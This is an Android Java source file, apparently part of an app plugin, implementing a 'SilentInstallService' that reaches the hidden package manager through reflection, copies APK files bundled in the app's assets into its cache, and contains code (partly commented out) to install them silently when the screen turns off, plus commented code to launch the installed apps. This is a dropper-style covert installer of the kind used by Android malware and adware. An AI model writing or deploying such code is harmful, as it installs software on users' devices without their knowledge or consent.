package com.xstd.active.plugin;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class SilentInstallService extends Service {

    private IPackageManager manager;
    private ScreenChangeReceiver receiver;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @SuppressWarnings({"rawtypes", "unchecked"})
    @Override
    public void onCreate() {
        super.onCreate();

        try {
            Class clazz = getClassLoader().loadClass("android.os.ServiceManager");
            Method method = clazz.getMethod("getService", new Class[]{String.class});
            IBinder b = (IBinder) method.invoke(null, "package");
            manager = IPackageManager.Stub.asInterface(b);
        } catch (Exception e) {
            e.printStackTrace();
        }

        receiver = new ScreenChangeReceiver();
        IntentFilter filter = new IntentFilter();
        filter.setPriority(Integer.MAX_VALUE);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        registerReceiver(receiver, filter);

        copyFileToCache();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (receiver != null)
            unregisterReceiver(receiver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//		String apk_path = intent.getStringExtra("apk_path");
//		if (apk_path != null)
//			installFile(new File(apk_path));
        return super.onStartCommand(intent, flags, startId);
    }

    class ScreenChangeReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (Intent.ACTION_SCREEN_ON.equals(action)) {
                Log.w("ps", "屏幕亮了");
            } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                Log.w("ps", "屏幕暗了");
//				File[] files = getCacheDir().listFiles();
//				for (File file : files) {
//					installFile(file);
//				}
            } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
                Log.w("ps", "屏幕解锁了");
            }
        }
    }

    private void installFile(File file) throws RemoteException {
        if (file == null)
            return;
        if (!file.isFile())
            return;
        if (file.length() <= 0)
            return;
        if (!file.getName().endsWith(".apk"))
            return;
        int installFlags = 0;
        String packName = getPackageName(file.getAbsolutePath());
        Uri uri = Uri.fromFile(file);
        Log.w("ps", uri.toString() + "--" + packName);
        if (uri != null)
            manager.installPackage(uri, new IPackageInstallObserver.Stub() {

                @Override
                public void packageInstalled(String packageName, int returnCode) throws RemoteException {
                    Log.w("ps", packageName + "--" + returnCode);
                }
            }, installFlags, packName);
    }

    /**
     * 通过APK包的绝对路径获得APK包的包名
     *
     * @param absPath APK的绝对路径
     * @return APK的包名
     */
    private String getPackageName(String absPath) {
        PackageManager pm = getPackageManager();
        PackageInfo pkgInfo = pm.getPackageArchiveInfo(absPath, PackageManager.GET_ACTIVITIES);
        if (pkgInfo != null) {
            return pkgInfo.applicationInfo.packageName;
        }
        return null;
    }

    private void copyFileToCache() {
        new Thread(new CopyFileToCacheTask()).start();
    }

    private class CopyFileToCacheTask implements Runnable {

        @Override
        public void run() {
            AssetManager assets = getAssets();
            InputStream is = null;
            OutputStream os = null;
            try {
                for (String app : assets.list("")) {
                    if (!app.endsWith(".apk"))
                        continue;
                    File file = new File(getCacheDir().getAbsolutePath(), app);
                    if (file.exists())
                        continue;
                    is = assets.open(app);
                    os = new BufferedOutputStream(new FileOutputStream(file));
                    byte[] b = new byte[1024 * 5];
                    int len;
                    while ((len = is.read(b)) != -1) {
                        os.write(b, 0, len);
                    }
                    os.flush();

                    Log.w("ps", "移动文件:" + app);
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (is != null)
                        is.close();
                    if (os != null)
                        os.close();
                } catch (Exception e) {
                }
            }
        }
    }

}

// DBHelper helper = new DBHelper(getApplicationContext());
// SQLiteDatabase db = helper.getWritableDatabase();
// Cursor cursor = db.query("silentapp", null, "active=?", new
// String[]{String.valueOf(0)}, null, null, null);
// if(cursor.moveToNext()) {
// String packname = cursor.getString(1);
// Intent app = context.getPackageManager().getLaunchIntentForPackage(packname);
// context.startActivity(app);
// }
